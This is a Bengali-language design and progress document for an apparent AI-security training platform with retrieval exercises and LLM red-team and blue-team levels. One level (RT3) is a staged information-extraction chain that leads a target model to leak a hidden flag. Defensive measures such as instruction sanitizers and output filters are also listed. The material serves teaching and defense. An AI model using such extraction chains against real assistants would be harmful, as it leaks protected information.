**Blue team জোড়া:** প্রতিটা attack level-এর একটা defense সংস্করণ থাকবে। সেখানে learner ঠিক করবে:
- ACL filter কখন চলবে (retrieve-এর আগে না পরে)
- Instruction sanitizer
- Output filter
- Source-এর trust level

Grade হবে দুটো hidden suite-এ: attack suite-এর ≥ X% আটকাতে হবে, **আর** benign suite-এর ≥ Y% প্রশ্নের উত্তর দিতে হবে। এটা R2-এর cost বনাম quality-র মতোই একটা trade-off।

### ৭.৭ Content invariant (CI-তে বাধ্যতামূলক)

- প্রতিটা exercise-এ reference pass করবে, near-miss fail করবে, আর পরিচিত exploit-গুলো fail করবে। Exploit-এর তালিকা: পুরো corpus, সর্বোচ্চ k, keyword-ভর্তি prompt।
- **Transfer test:** একই পরিবারের অন্য exercise-এর reference এখানে fail করবে।
- Hidden set-এর overlap ≤ ১০%। Public আর hidden-এর মধ্যে overlap ০।
- Flag, gold span আর hidden প্রশ্ন কোনো public API response-এ থাকবে না। এটা contract test দিয়ে চেক হবে।
- Content generator script hand-edit করা meta মুছে ফেলবে না। হয় generator-ই source of truth হবে, নয়তো script বাদ দিতে হবে।

---

## ৮. Roadmap

| Phase | কাজ | আকার |
|---|---|---|
| **A: Integrity** (আগে) | Sandbox-এ chunk ID আর token gate (G3) · R3-এ আসল model, নয়তো স্পষ্ট "simulated" লেবেল আর আলাদা gate (G1) · Lab endpoint-এ auth আর rate limit (E5) · Dynamic flag আর prefix ঠিক করা (E6) · RT3-এর brief ঠিক করা (T4) · Grader বাছাই `graderArchetype` দিয়ে · UI-এর দ্রুত fix: পুরো brief দেখানো (U1), 429-এ scorecard না মোছা (U2), mobile-এ config না হারানো (U3), fail run দেখানো (U4), attempt counter, track list-এ ২৮টা exercise | ~১ সপ্তাহ |
| **B: Eval** | প্রতিটা exercise-এর নিজের hidden set, feedback/holdout split, tag (E1–E3) · Feedback প্রমাণ থেকে (G10) · CI invariant (§৭.৭) | ১–২ সপ্তাহ |
| **C: Engine** | Dense আর hybrid, cross-encoder cache, আসল tokenizer আর cost (G5, G6) · Chunking ঠিক করা (G7) · R4 rewrite আসলেই ব্যবহার (G8) · Unicode tokenizer | ২–৩ সপ্তাহ |
| **D: Curriculum** | R1b/R1c/R2b–e/R3b/R4b/R6, clone-গুলোকে নতুন mechanic দিয়ে বদলানো · Corpus ২০০টার বেশি doc, distractor আর version সহ | ৩–৪ সপ্তাহ |
| **E: Red/Blue + UI v2** | RT v2, blue team জোড়া · Pipeline builder, probe table, debrief | ৩–৪ সপ্তাহ |

---

### Phase A-এর অবস্থা (২০২৬-১১-১৭)

| কাজ | অবস্থা |
|---|---|
| Sandbox exploit | ✅ প্রতিটা passage একটা doc-এর টানা অংশ হতে হবে (`passages_from_corpus` gate), সাথে `mean_context_tokens` budget। নতুন reference sentence-level। পুরো corpus পাঠানো আর পুরো doc ফেরত দেওয়া, দুটোই fail করে। |
| R3-এ আসল model | ✅ `ModelGateway.generate()`: OpenRouter, temperature 0, `(model, prompt)` ধরে cache, budget আর run-এ খরচ লেখা। Learner-এর prompt সরাসরি system message হিসেবে যায়। Live model-এ reference pass করে। `cite refuse` আর pirate prompt fail করে। আবার grade করলে cache থেকে ০ token-এ একই verdict আসে। Lab-এর Generate preview-ও আসল model চালায়। |
| Lab endpoint | ✅ `preview`, `estimate` আর `target` login চায়। প্রতিটা learner-এর সীমা: preview ৬০/মিনিট, estimate ১২০/মিনিট, target ৩০/মিনিট (in-memory, একটা API process ধরে)। |
| Dynamic flag | ✅ `AIWARSS{<tag>_<HMAC(userId:slug)>}`। Content-এ শুধু `{{FLAG}}` placeholder থাকে। Secret: `REDTEAM_FLAG_SECRET`। |
| RT3 brief | ✅ Recon chain: "Globex" জিজ্ঞেস করলে roadmap আসে, roadmap-এ "Project Lighthouse"-এর নাম পাওয়া যায়, আর সেটা জিজ্ঞেস করলে flag আসে। |
| Attempt counter | ✅ `GET /exercises/:slug/attempt-budget` আর UI-তে "N of M left · resets HH:MM"। |
| UI দ্রুত fix (U1–U4, track list, target console) | ✅ |
| Grader বাছাই `graderArchetype` দিয়ে | ⏭ Phase B-তে সরানো হয়েছে। DB-তে এর column নেই, তাই migration লাগবে। |

### Phase B-এর অবস্থা (২০২৬-১১-১৭)

| কাজ | অবস্থা |
|---|---|
| Feedback/holdout split | ✅ প্রতিটা hidden প্রশ্নের `split` ঠিক হয় **প্রশ্নের লেখার hash থেকে**, exercise থেকে না। তাই একই প্রশ্ন যতগুলো exercise-এ থাকুক, সবখানে একই split পায়। Holdout প্রশ্ন কোনো exercise-এ কখনো দেখানো হয় না। Feedback প্রায় ১/৩, প্রতিটা exercise-এ কমপক্ষে ৫টা উত্তরযোগ্য feedback প্রশ্ন। |
| Tag | ✅ Content থেকে হিসাব করে বসানো: `lexical`/`paraphrase` (প্রশ্ন আর উত্তর-বাক্যে কতটা শব্দ মেলে), `numeric`, `multi-sentence`, `unanswerable`, `distractor` (whole-doc BM25-এ অন্য doc এগিয়ে থাকে), আর R5-এর class। Script: `scripts/content/tag-rag-eval.mjs` (`--check` দিলে CI-তে চেক করে)। |
| Breakdown | ✅ `scorecard.breakdown`-এ থাকে: split অনুযায়ী hit, tag অনুযায়ী hit, miss-এর কারণ (শুধু সংখ্যা), gold-এর rank, আর token খরচ কোথায় গেল। UI-তে দুটো নতুন অংশ: "Why it missed" আর "Hidden set"। |
| Failure class আসল ঘটনা থেকে (G10) | ✅ Config দেখে আন্দাজ করা class সরানো হয়েছে, যেমন `topk-too-high`, `policy-needs-rerank`। এখন class আসে ranking থেকে: `gold-split-by-chunking`, `gold-ranked-below-k`, `gold-outside-rerank-pool`, `rerank-demoted-gold`, `rerank-did-not-lift-gold`। R5-এ class-এর নাম সামনে বসে, যেমন `procedural:gold-split-by-chunking`। |
| Sandbox দিয়ে holdout ফাঁস | ✅ Corpus-এর অংশ না এমন passage আর দেখানো হয় না। Hidden run-এর `stderr`-ও দেখানো হয় না। Crash হলে program-টা শুধু public sample-এ আবার চালানো হয়, আর সেই run-এর error দেখানো হয়। |
| Grader বাছাই `graderArchetype` দিয়ে | ✅ DB migration ছাড়াই করা হয়েছে: `content/archetype-registry.ts` content-এর `meta.json` থেকে পড়ে। পুরনো slug-নম্বরের নিয়ম শুধু fallback হিসেবে আছে। |
| CI invariant | ✅ `rag-eval-invariants.spec.ts` চেক করে: split আর tag-এর schema, একই প্রশ্নের split সবখানে এক কিনা, public আর hidden-এর overlap শূন্য কিনা, প্রতিটা gold span তার doc-এ সত্যিই আছে কিনা, আর grader কখনো holdout প্রশ্ন দেখায় কিনা। |
| প্রতিটা exercise-এর আলাদা hidden প্রশ্ন (E1) | ⏭ **Phase D-তে সরানো হয়েছে।** Shared corpus-এ ১৬টা policy doc মানে মোটামুটি ৮০টা তথ্য, অথচ ১৬টা exercise এটা ব্যবহার করে। একই তথ্যকে ঘুরিয়ে প্রশ্ন লিখে "আলাদা" set বানালে আসলে কোনো লাভ নেই। ফাঁস হওয়ার মূল পথটা split এমনিতেই বন্ধ করেছে, কারণ holdout প্রশ্ন কোথাও দেখানো হয় না। সত্যিকারের আলাদা set আসবে নতুন আর বড় corpus-এর সাথে। |

### Phase C-এর অবস্থা (২০২৬-১১-১৮)

| কাজ | অবস্থা |
|---|---|
| আসল tokenizer | ✅ RAG-এর সব token gate এখন `cl100k_base` দিয়ে গোনা হয় (`countTokens`), অক্ষর ÷ ৪ দিয়ে না। এই corpus-এ আসল token প্রায় ২৫% কম আসে, তাই প্রতিটা token gate মোটামুটি ×০.৭৫ করা হয়েছে (যেমন R1 ২২০ → ১৬৫, R2 ৮০ → ৬০, R4 ৭০০ → ৫০০, sandbox ২০০ → ১৫০)। কঠিনতা আগের মতোই: সব reference pass, সব near-miss আর exploit fail। Lab-এর chunk-এও এখন আসল token সংখ্যা দেখায়। Live model call-এর token-ও এই tokenizer দিয়ে গোনা হয়। |
| Cost | ⚠️ আংশিক। Run-এর cost এখনো budget price table থেকে আসে (ইচ্ছে করে list price-এর চেয়ে বেশি), provider-এর invoice থেকে না। শুধু retrieval-এর archetype-এ model call নেই, তাই সেখানে cost ০ থাকাটাই সঠিক। |
| Unicode tokenizer (BM25) | ✅ `\p{L}\p{M}\p{N}` দিয়ে শব্দ ধরা হয়, NFKC normalize করে। বাংলা প্রশ্নে এখন আসল term আসে। ইংরেজির ফল আগের মতোই (tag script `--check`-এ কোনো পরিবর্তন নেই)। |
| Chunking ঠিক করা (G7) | ✅ চারটা strategy এখন সত্যিই আলাদা: `fixed` শব্দের window (শব্দ কাটে না, বাক্য কাটে), `sentence` পুরো বাক্য (বাক্য কখনো কাটে না), `recursive` paragraph → line → বাক্য → শব্দ (size কড়া সীমা), `heading-aware` markdown heading ধরে section, আর প্রতিটা chunk-এর শুরুতে title আর heading path। Overlap এখন শুধু পুরো শব্দ বা বাক্য বহন করে। R3/R4-এর "পুরো doc এক chunk" এখন আলাদা internal mode `document`। |
| Dense আর hybrid (G5) | ✅ Engine-এ আছে। Embedding: `Xenova/bge-small-en-v1.5` (q8, commit pin করা), CPU-তে ONNX। Hybrid: BM25 আর cosine প্রতিটা প্রশ্নে min-max করে alpha দিয়ে মেশানো (০ = BM25, ১ = dense)। R2 payload-এ `retrievalMode` আর `hybridAlpha` ঐচ্ছিক, না দিলে BM25। rag-017-এর hidden set-এ k=1: BM25 ০.৮০, dense ০.৮৫, hybrid ০.৯০ recall। |
| Cross-encoder (G6) | ✅ Engine-এ আছে: `Xenova/ms-marco-MiniLM-L-6-v2` (q8, commit pin করা), `(question, chunk)` ধরে cache। R4-এর reranker-এ `cross-encoder` যোগ হয়েছে। rag-028-এ nDCG gain ০.৪৬ (title boost ০.২৬), তবে context ৫০২ token, budget ৫০০। Title boost এখন "heuristic baseline" হিসেবে লেখা। |
| R4 rewrite আসলেই ব্যবহার (G8) | ✅ Rewrite prompt live model-এ চলে (system = learner-এর prompt, user = প্রশ্ন), উত্তরের প্রথম লাইন দিয়ে first stage খোঁজে। Reranker আসল প্রশ্নের সাথে মেলায়। rag-021-এ live rewrite দিয়ে nDCG gain ০.৩৫ (rewrite ছাড়া ০.২৬)। Lab-এ "Run rewrite" বাটন আছে। Estimate কখনো model ডাকে না, আর সেটা স্পষ্ট লেখা থাকে। Trace-এ "searched for" দেখায়। |
| Model চালানোর ব্যবস্থা | ✅ Model file (মোট ~৫৬ MB) commit ধরে Hugging Face থেকে নামে `apps/api/.cache/models`-এ, আর সবসময় local file থেকে load হয়। Deploy-এ `npm run models:fetch` চালিয়ে `RAG_MODELS_ALLOW_DOWNLOAD=false` দেওয়া যায়। Score ছোট দশমিকে round করা হয়, যাতে CPU-ভেদে ranking না বদলায়। |
| কোন exercise নতুন knob দেখায় | ⏭ **Phase D।** কোনো exercise-এর schema এখনো `retrievalMode`, `hybridAlpha` বা `cross-encoder` দেয় না। এখনকার exercise-এ এগুলো খুলে দিলে পুরনো puzzle সহজ হয়ে যেত, নতুন mechanic শেখাত না। R2b (hybrid) আর R2d (আসল reranker) নতুন corpus দিয়ে বানাতে হবে। |
| বহুভাষিক embedding (R6) | ⏭ Phase D। bge-small শুধু ইংরেজি। বাংলা corpus এলে multilingual model pin করতে হবে। |
| Embedding index আগে থেকে বানানো | ⏭ লাগেনি। Runtime-এ embed করে memory-তে cache রাখা হয়। পুরো content check (model load সহ) ~১৩ সেকেন্ডে চলে। Corpus ১০ হাজার chunk ছাড়ালে pgvector লাগবে। |

## ৯. যেসব সিদ্ধান্ত টিমকে নিতে হবে

1. **Grading-এ আসল model:** প্রতিটা R3 attempt-এ ~৩০টা প্রশ্ন, মোটামুটি ২০–২৫ হাজার token। Cache থাকায় একই submission আবার দিলে খরচ শূন্য। এই খরচ মেনে নেওয়া যাবে, নাকি R3 simulated থাকবে আর UI-তে স্পষ্ট লেবেল দেওয়া হবে?
2. **Clone exercise:** slug রেখে নতুন mechanic দিয়ে বদলানো হবে (আমার সুপারিশ), নাকি নতুন slug বানিয়ে পুরনোগুলো সরিয়ে দেওয়া হবে?
3. **Per-user hidden subset:** anti-cheat-এর জন্য ভালো, কিন্তু তখন leaderboard আর contest-এ সবাই একই প্রশ্ন পাবে না। Contest-এ বন্ধ রাখা হবে কি?
4. **Red team Tier 2 (আসল model):** কোন level-গুলোতে, আর প্রতিটা user-এর quota কত হবে?
